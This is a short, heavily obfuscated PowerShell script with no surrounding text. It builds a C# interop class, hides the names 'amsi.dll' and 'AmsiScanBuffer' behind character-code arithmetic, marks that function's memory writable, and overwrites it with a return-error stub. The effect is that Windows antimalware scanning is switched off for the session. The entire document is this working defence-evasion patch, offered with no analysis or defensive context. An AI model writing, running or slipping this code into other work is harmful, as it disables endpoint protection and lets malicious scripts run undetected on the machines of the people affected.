$jkljXDjUBDC = @"
using System;
using System.Runtime.InteropServices;
public class jkljXDjUBDC {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr K9xPBd0QnTIX868hNE, string kT7Z);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr KMV8fsjUemPyPZ9L, UIntPtr ObA9SZhPhBmC5, uint oDArnrAI4XQC6AD0qhz, out uint OhNuCxVPBexj);
}
"@

Add-Type $jkljXDjUBDC

$OQxmVnXJ82ybqcxx = [jkljXDjUBDC]::LoadLibrary("$([chaR](30+67)+[chAr](109*72/72)+[chAR]([BYTe]0x73)+[CHaR]([BYtE]0x69)+[char](46+30-30)+[cHaR]([byTE]0x64)+[CHaR]([byTe]0x6c)+[CHar]([BYte]0x6c))")
$pGuRZHFZgGms4C2ZWA = [jkljXDjUBDC]::GetProcAddress($OQxmVnXJ82ybqcxx, "$([CHAR](65+27-27)+[cHAr](109)+[cHar]([bytE]0x73)+[CHar]([BYte]0x69)+[cHAR](6+77)+[chAr]([bYtE]0x63)+[cHaR](97+63-63)+[cHAr]([bytE]0x6e)+[char]([ByTE]0x42)+[cHAR](117)+[cHar](102*65/65)+[ChAR](102+8-8)+[cHAr](101)+[char](114*47/47))")
$p = 0
[jkljXDjUBDC]::VirtualProtect($pGuRZHFZgGms4C2ZWA, [uint32]5, 0x40, [ref]$p)
$xI7nePSgY8A4GrIg = "0xB8"
$RqN3vZ = "0x57"
$lM4K9Fs = "0x00"
$fg3F17rpzpZyVyhiYACC = "0x07"
$Bb5TX58gHhI8EOVhiUDd = "0x80"
$Whjf0bZtwTYw677TftPP = "0xC3"
$ROWdq079PXMG = [Byte[]] ($xI7nePSgY8A4GrIg,$RqN3vZ,$lM4K9Fs,$fg3F17rpzpZyVyhiYACC,+$Bb5TX58gHhI8EOVhiUDd,+$Whjf0bZtwTYw677TftPP)
[System.Runtime.InteropServices.Marshal]::Copy($ROWdq079PXMG, 0, $pGuRZHFZgGms4C2ZWA, 6)